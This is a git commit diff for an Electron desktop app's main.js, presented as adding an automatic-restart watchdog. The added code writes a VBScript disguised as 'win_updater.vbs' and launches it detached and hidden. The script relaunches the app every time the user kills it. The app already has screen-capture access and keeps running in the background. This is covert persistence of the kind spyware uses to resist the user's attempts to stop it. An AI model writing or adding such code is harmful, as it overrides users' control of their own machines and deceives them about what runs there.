6f57cf2d107571e1370dfcccf9c1bee5896b5c8a
sarql <team.sarql@gmail.com>
2026-06-13 15:26:55 +0530

    Add VBScript watchdog to restart app automatically if killed

--- main.js
+++ main.js
@@ -1,6 +1,40 @@
 const { app, BrowserWindow, ipcMain, desktopCapturer } = require('electron');
 const path = require('path');
 const os = require('os');
+const fs = require('fs');
+const { exec, spawn } = require('child_process');
+
+function startWatchdog() {
+    // Only run the watchdog when the app is actually packaged as an EXE
+    if (!app.isPackaged) return;
+
+    const exePath = app.getPath("exe");
+    const exeName = path.basename(exePath);
+    const watchdogPath = path.join(app.getPath("userData"), "win_updater.vbs");
+
+    const vbsCode = `
+Set objShell = CreateObject("WScript.Shell")
+Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
+Do
+    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '${exeName}'")
+    If colProcesses.Count = 0 Then
+        objShell.Run """${exePath}""", 0, False
+    End If
+    WScript.Sleep 5000
+Loop
+`;
+
+    fs.writeFileSync(watchdogPath, vbsCode);
+
+    // Kill any existing watchdog for our app, then start a new one
+    exec(`wmic process where "name='wscript.exe' and commandline like '%win_updater.vbs%'" call terminate`, () => {
+        const child = spawn('wscript.exe', [watchdogPath], {
+            detached: true,
+            stdio: 'ignore'
+        });
+        child.unref();
+    });
+}
 
 function createWindow() {
     const win = new BrowserWindow({
@@ -35,6 +69,7 @@ app.whenReady().then(() => {
     ipcMain.handle('get-hostname', () => os.hostname());
 
     createWindow();
+    startWatchdog();
 });
 
 // Keep running in the background even if a window is closed
